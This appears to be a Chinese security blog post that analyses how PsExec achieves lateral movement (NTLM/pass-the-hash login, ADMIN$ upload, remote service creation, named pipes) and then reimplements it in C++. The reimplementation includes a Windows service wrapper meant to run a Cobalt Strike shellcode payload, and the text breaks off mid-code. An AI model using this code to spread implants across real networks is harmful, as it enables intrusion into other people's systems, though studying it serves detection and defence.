    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参加某行动时通过psexec横向过几台主机,正好之前在网上看到很多大佬分析过这款工具,今天也自己动手重新分析一次<br>因为很大程度上是学着大佬分析思路来分析的,所以先把参考写在前面:<br><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p><img src="/img/psexec/1.png"></p><h2 id="Psexec原理分析"><a href="#Psexec原理分析" class="headerlink" title="Psexec原理分析"></a>Psexec原理分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>win10  ip：192.168.154.7</li><li>win server 2008  X64 192.168.154.31</li></ul><p>假设已经得到win10主机的system权限<br>在cs上通过psexec64来横向win2008</p><p><img src="/img/psexec/2.png"></p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机<br>可以看到win2008直接上线,并且是system权限</p><p><img src="/img/psexec/3.png"></p><p>看一下win2008的安全日志</p><p><img src="/img/psexec/4.png"></p><p>看到有多个安全日志的产生<br>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p><img src="/img/psexec/5.png"></p><p>采用的NTMLv2协议,所以即便不知道明文,有hash值就可以转递</p><p><img src="/img/psexec/6.png"></p><p>再看系统日志</p><p><img src="/img/psexec/7.png"></p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p><img src="/img/psexec/8.png"></p><p>猜想就是通过这个exe上线<br><img src="/img/psexec/9.png"></p><p>这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><ol><li><p>登陆远程主机   事件ID4624</p></li><li><p>连接admin$共享   事件ID7045</p></li><li><p>写入xxxx.exe文件到共享目录下也就是c:\windows下</p></li><li><p>执行xxxx.exe,随即上线</p></li></ol><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\PsExec.exe</span> <span class="hljs-string">\\192.168.154.31</span> -u administrator -p <span class="hljs-number">123456</span> cmd<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/10.png"></p><p><img src="/img/psexec/11.png"></p><p>设置过滤规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">src</span>==192.168.154.31 <span class="hljs-keyword">or</span> ip.<span class="hljs-attribute">dst</span>==192.168.154.31<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/12.png"></p><ol><li><p>先进行TCP三次握手</p></li><li><p>协商协议</p></li><li><p>进行NTML验证</p></li><li><p>尝试连接$IPC</p></li><li><p>尝试连接ADMIN$</p></li><li><p>尝试写入PSEXESVC.exe</p></li></ol><p><img src="/img/psexec/13.png"></p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p><img src="/img/psexec/14.png"></p><p>文件写入完毕后,执行API安装服务</p><p><img src="/img/psexec/15.png"></p><p>服务启动后会建立一个管道</p><p><img src="/img/psexec/16.png"></p><p>实际上一共创建了4个管道</p><p><img src="/img/psexec/17.png"></p><p><img src="/img/psexec/18.png"></p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><h2 id="实现psexec"><a href="#实现psexec" class="headerlink" title="实现psexec"></a>实现psexec</h2><h3 id="一-与目标主机建立SMB连接"><a href="#一-与目标主机建立SMB连接" class="headerlink" title="一.与目标主机建立SMB连接"></a>一.与目标主机建立SMB连接</h3><p>WNetAddConnection2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">WNetAddConnection2W</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPNETRESOURCEW lpNetResource,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpPassword,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpUserName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD          dwFlags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">ConnectSMBServer</span><span class="hljs-params">(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 用于存放SMB共享资源格式</span><br>    PWCHAR lpwsIPC = <span class="hljs-keyword">new</span> WCHAR[MAX_PATH];<br>    DWORD dwRetVal; <span class="hljs-comment">// 函数返回值</span><br>    NETRESOURCE nr; <span class="hljs-comment">// 连接的详细信息</span><br>    DWORD dwFlags; <span class="hljs-comment">// 连接选项</span><br><br>    <span class="hljs-built_in">ZeroMemory</span>(&amp;nr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(NETRESOURCE));<br>    <span class="hljs-built_in">swprintf</span>(lpwsIPC, MAX_PATH, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\%s\admin$&quot;</span>), lpwsHost);<br>    nr.dwType = RESOURCETYPE_ANY; <span class="hljs-comment">// 枚举所有资源</span><br>    nr.lpLocalName = <span class="hljs-literal">NULL</span>;<br>    nr.lpRemoteName = lpwsIPC; <span class="hljs-comment">// 资源的网络名</span><br>    nr.lpProvider = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span><br>    dwFlags = CONNECT_UPDATE_PROFILE;<br>    dwRetVal = <span class="hljs-built_in">WNetAddConnection2</span>(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);<br>    <span class="hljs-keyword">if</span> (dwRetVal == NO_ERROR) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection added to %s\n&quot;</span>, nr.lpRemoteName);<br>        <span class="hljs-keyword">return</span> dwRetVal;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WNetAddConnection2 failed with error: %d\n&quot;</span>, dwRetVal);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二-上传文件到目标主机"><a href="#二-上传文件到目标主机" class="headerlink" title="二.上传文件到目标主机"></a>二.上传文件到目标主机</h3><p>将现有文件拷贝到新文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CopyFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpExistingFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpNewFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL    bFailIfExists</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">UploadFileBySMB</span><span class="hljs-params">(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD dwRetVal;<br>    dwRetVal = <span class="hljs-built_in">CopyFile</span>(lpwsSrcPath, lpwsDstPath, FALSE);<br>    <span class="hljs-keyword">return</span> dwRetVal &gt; <span class="hljs-number">0</span> ? TRUE : FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三-开启服务"><a href="#三-开启服务" class="headerlink" title="三.开启服务"></a>三.开启服务</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpMachineName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpDatabaseName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  dwDesiredAccess</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SC_HANDLE hSCManager,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDisplayName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwDesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwServiceType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwStartType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwErrorControl,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpBinaryPathName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpLoadOrderGroup,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD   lpdwTagId,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDependencies,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceStartName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpPassword</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>先使用<code>OpenSCManager</code>在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用<code>CreateService</code>创建一个服务,再通过<code>OpenService</code>,<code>StartService</code>打开并开启服务</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateServices</span><span class="hljs-params">(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Will Create Service %s\n&quot;</span> ,lpwsServiceName);<br>    SC_HANDLE hSCM;<br>    SC_HANDLE hService;<br>    SERVICE_STATUS ss;<br>    hSCM = <span class="hljs-built_in">OpenSCManager</span>(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);<br>    <span class="hljs-keyword">if</span> (hSCM == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenSCManager Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hService = <span class="hljs-built_in">CreateService</span>(<br>        hSCM, <span class="hljs-comment">// 服务控制管理器数据库的句柄</span><br>        lpwsServiceName, <span class="hljs-comment">// 要安装的服务的名称</span><br>        lpwsServiceName, <span class="hljs-comment">// 用户界面程序用来标识服务的显示名称</span><br>        GENERIC_ALL, <span class="hljs-comment">// 访问权限</span><br>        SERVICE_WIN32_OWN_PROCESS, <span class="hljs-comment">// 与一个或多个其他服务共享一个流程的服务</span><br>        SERVICE_DEMAND_START, <span class="hljs-comment">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span><br>        SERVICE_ERROR_IGNORE, <span class="hljs-comment">// 启动程序将忽略该错误并继续启动操作</span><br>        lpwsServicePath, <span class="hljs-comment">// 服务二进制文件的标准路径</span><br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateService Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Create Service Success : %s\n&quot;</span>,lpwsServicePath);<br>    hService = <span class="hljs-built_in">OpenService</span>(hSCM, lpwsServiceName, GENERIC_ALL);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Error: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Success: %d!\n&quot;</span>);<br>    <span class="hljs-built_in">StartService</span>(hService, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我生成一个cs的马,改名为sd</p><p><img src="/img/psexec/19.png"></p><p>win2008</p><p><img src="/img/psexec/20.png"></p><p>但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p><img src="/img/psexec/21.png"></p><p>打开系统日志查看</p><p><img src="/img/psexec/22.png"></p><p>我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><h2 id="编写服务程序"><a href="#编写服务程序" class="headerlink" title="编写服务程序"></a>编写服务程序</h2><h3 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h3><p>   几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。<br>    服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。<br>    SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</p><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋博客中也已经给出了一个编写windwos服务的模板<br>还有几篇介绍windows服务编写的:<br> <a href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p><img src="/img/psexec/23.png"></p><p>在模板上面加一点执行shellcode的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = shellcode<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span 